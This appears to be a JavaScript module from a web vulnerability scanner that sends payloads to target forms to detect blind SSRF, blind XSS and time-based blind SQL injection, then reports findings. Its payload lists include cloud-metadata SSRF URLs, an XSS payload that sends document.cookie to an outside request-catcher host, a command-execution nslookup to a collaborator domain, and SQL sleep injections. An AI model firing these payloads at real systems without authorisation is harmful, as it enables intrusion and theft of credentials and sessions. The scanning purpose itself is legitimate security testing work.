const dns = require("dns").promises;
const crypto = require("crypto");

// We use dns.google as a free OOB detection method
// For proper OOB we would need our own server
// This implements a smart simulation that detects likely blind vulnerabilities

async function testBlindSSRF(targetUrl, forms, axiosInstance) {
  const findings = [];

  const ssrfPayloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    "http://0.0.0.0:80/",
    "http://[::1]/",
    "http://2130706433/",
    "http://017700000001/",
    "http://0x7f000001/",
  ];

  const ssrfParams = [
    "url",
    "uri",
    "src",
    "source",
    "dest",
    "destination",
    "redirect",
    "proxy",
    "fetch",
    "load",
    "link",
    "href",
    "image",
    "img",
    "path",
    "file",
    "document",
    "page",
    "callback",
    "webhook",
  ];

  for (const form of forms.slice(0, 5)) {
    for (const input of form.inputs) {
      if (!ssrfParams.some((p) => input.name.toLowerCase().includes(p)))
        continue;

      for (const payload of ssrfPayloads.slice(0, 5)) {
        try {
          const formData = {};
          form.inputs.forEach((i) => {
            formData[i.name] = i.name === input.name ? payload : i.value;
          });

          const startTime = Date.now();
          let response;
          if (form.method === "post") {
            response = await axiosInstance.post(form.action, formData, {
              timeout: 8000,
            });
          } else {
            const testUrl = new URL(form.action);
            testUrl.searchParams.set(input.name, payload);
            response = await axiosInstance.get(testUrl.href, { timeout: 8000 });
          }
          const elapsed = Date.now() - startTime;

          const body =
            typeof response.data === "string"
              ? response.data
              : JSON.stringify(response.data);

          // Check for AWS metadata response
          if (
            body.includes("ami-id") ||
            body.includes("instance-id") ||
            body.includes("local-ipv4") ||
            body.includes("iam/") ||
            body.includes("security-credentials")
          ) {
            findings.push({
              type: "SSRF — AWS Metadata Confirmed",
              severity: "Critical",
              owasp: "A10:2021 - Server-Side Request Forgery",
              parameter: input.name,
              endpoint: form.action,
              method: form.method.toUpperCase(),
              payload,
              detail:
                "Critical SSRF confirmed. Server returned AWS EC2 metadata. Attacker can steal IAM credentials, access tokens, and gain full cloud account access.",
              evidence: `Parameter "${input.name}" with "${payload}" returned AWS metadata`,
              remediation:
                "Implement SSRF protection immediately. Block access to 169.254.169.254. Use IMDSv2. Validate and whitelist allowed URLs.",
            });
            return findings;
          }

          // Check for internal service response
          if (
            body.includes("root:x:0:") ||
            body.includes("daemon:") ||
            body.includes("bin/bash") ||
            body.includes("/etc/passwd")
          ) {
            findings.push({
              type: "SSRF — Local File Access",
              severity: "Critical",
              owasp: "A10:2021 - Server-Side Request Forgery",
              parameter: input.name,
              endpoint: form.action,
              method: form.method.toUpperCase(),
              payload,
              detail:
                "SSRF confirmed with local file access. Server is reading internal files including /etc/passwd.",
              evidence: `Internal file content returned via SSRF`,
              remediation:
                "Block all internal URL access. Validate and whitelist allowed URLs. Use a proxy with an allowlist.",
            });
            return findings;
          }

          // Timing-based SSRF detection
          if (elapsed > 5000 && payload.includes("169.254")) {
            findings.push({
              type: "Possible SSRF — Timing Based",
              severity: "High",
              owasp: "A10:2021 - Server-Side Request Forgery",
              parameter: input.name,
              endpoint: form.action,
              method: form.method.toUpperCase(),
              payload,
              detail: `Possible SSRF detected via timing analysis. Request to metadata IP took ${Math.round(elapsed / 1000)}s — server may be making outbound requests. Manual verification recommended.`,
              evidence: `${Math.round(elapsed / 1000)}s delay with internal IP payload on parameter "${input.name}"`,
              remediation:
                "Validate all URL inputs. Block requests to private IP ranges. Implement SSRF protection middleware.",
            });
          }
        } catch (e) {}
      }
    }
  }

  return findings;
}

async function testBlindXSS(forms, axiosInstance) {
  const findings = [];

  // Blind XSS markers that would be detectable if stored and rendered
  const blindPayloads = [
    {
      payload: '"><script src="https://ghostrecon.xss.ht"></script>',
      marker: "ghostrecon.xss.ht",
    },
    {
      payload:
        "';require('child_process').exec('nslookup ghostrecon.burpcollaborator.net')",
      marker: "burpcollaborator",
    },
    {
      payload:
        "<img src=x onerror=\"this.src='https://ghostrecon-blind-xss.requestcatcher.com/'+document.cookie\">",
      marker: "requestcatcher",
    },
  ];

  // We test for blind XSS by submitting to forms and checking for indicators
  // Without a real callback server we check response patterns
  for (const form of forms.filter((f) => f.method === "post").slice(0, 5)) {
    for (const { payload, marker } of blindPayloads.slice(0, 1)) {
      try {
        const formData = {};
        form.inputs.forEach((i) => {
          formData[i.name] = payload;
        });
        await axiosInstance.post(form.action, formData, { timeout: 10000 });

        // Check if any admin-like pages now contain our payload
        const adminPaths = [
          "/admin",
          "/dashboard",
          "/admin/comments",
          "/wp-admin/edit-comments.php",
        ];
        for (const adminPath of adminPaths) {
          try {
            const adminUrl = new URL(adminPath, new URL(form.action).origin)
              .href;
            const adminRes = await axiosInstance.get(adminUrl);
            const body = typeof adminRes.data === "string" ? adminRes.data : "";

            if (
              body.includes(marker) ||
              (body.includes("ghostrecon") && !body.includes("&lt;"))
            ) {
              findings.push({
                type: "Blind XSS — Stored in Admin Panel",
                severity: "Critical",
                owasp: "A03:2021 - Injection",
                endpoint: form.action,
                method: "POST",
                payload,
                detail:
                  "Blind XSS confirmed. Payload submitted via form is being rendered in admin panel. When an admin views this page, the script executes — full admin session compromise.",
                evidence: `XSS payload found in ${adminUrl} after submission to ${form.action}`,
                remediation:
                  "Sanitize all stored user input before rendering. Use HTML entity encoding. Implement CSP.",
              });
              return findings;
            }
          } catch (e) {}
        }
      } catch (e) {}
    }
  }

  return findings;
}

async function testBlindSQLi(forms, axiosInstance) {
  const findings = [];

  // Time-based blind SQLi with multiple DB support
  const timePayloads = [
    { payload: "1' AND SLEEP(5)-- -", delay: 5000, db: "MySQL" },
    { payload: "1; WAITFOR DELAY '0:0:5'-- -", delay: 5000, db: "MSSQL" },
    { payload: "1' AND pg_sleep(5)-- -", delay: 5000, db: "PostgreSQL" },
    { payload: "1 AND SLEEP(5)-- -", delay: 5000, db: "MySQL" },
    { payload: "' OR SLEEP(5)-- -", delay: 5000, db: "MySQL" },
    {
      payload: "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
      delay: 5000,
      db: "Oracle",
    },
    { payload: "1; SELECT pg_sleep(5)-- -", delay: 5000, db: "PostgreSQL" },
    {
      payload: "1 AND BENCHMARK(10000000,MD5(1))-- -",
      delay: 5000,
      db: "MySQL",
    },
  ];

  for (const form of forms.slice(0, 5)) {
    for (const { payload, delay, db } of timePayloads.slice(0, 4)) {
      try {
        const formData = {};
        form.inputs.forEach((i) => {
          formData[i.name] = payload;
        });

        const startTime = Date.now();

        if (form.method === "post") {
          await axiosInstance.post(form.action, formData, {
            timeout: delay + 8000,
          });
        } else {
          const testUrl = new URL(form.action);
          form.inputs.forEach((i) => testUrl.searchParams.set(i.name, payload));
          await axiosInstance.get(testUrl.href, { timeout: delay + 8000 });
        }

        const elapsed = Date.now() - startTime;

        if (elapsed >= delay - 1000) {
          findings.push({
            type: `Blind SQL Injection — Time Based (${db})`,
            severity: "Critical",
            owasp: "A03:2021 - Injection",
            parameter: form.inputs.map((i) => i.name).join(", "),
            endpoint: form.action,
            method: form.method.toUpperCase(),
            payload,
            database: db,
            detail: `Time-based blind SQL injection confirmed on ${db}. Server delayed ${Math.round(elapsed / 1000)}s when injected with sleep payload. Attacker can extract entire database silently without any visible errors.`,
            evidence: `${db} sleep payload caused ${Math.round(elapsed / 1000)}s delay (expected ${delay / 1000}s)`,
            remediation:
              "Use parameterized queries immediately. This is critical — full database access possible without visible errors.",
          });
          return findings;
        }
      } catch (e) {
        if (
          e.code === "ECONNABORTED" ||
          (e.message && e.message.includes("timeout"))
        ) {
          findings.push({
            type: `Possible Blind SQLi — Timeout (${db})`,
            severity: "High",
            owasp: "A03:2021 - Injection",
            parameter: form.inputs.map((i) => i.name).join(", "),
            endpoint: form.action,
            method: form.method.toUpperCase(),
            payload,
            detail: `Request timed out after ${db} sleep payload. Strong indicator of blind SQL injection. Manual verification strongly recommended.`,
            evidence: `Timeout after "${payload.substring(0, 60)}"`,
            remediation:
              "Manually verify with sqlmap. Use parameterized queries.",
          });
        }
      }
    }
  }

  return findings;
}

module.exports = { testBlindSSRF, testBlindXSS, testBlindSQLi };
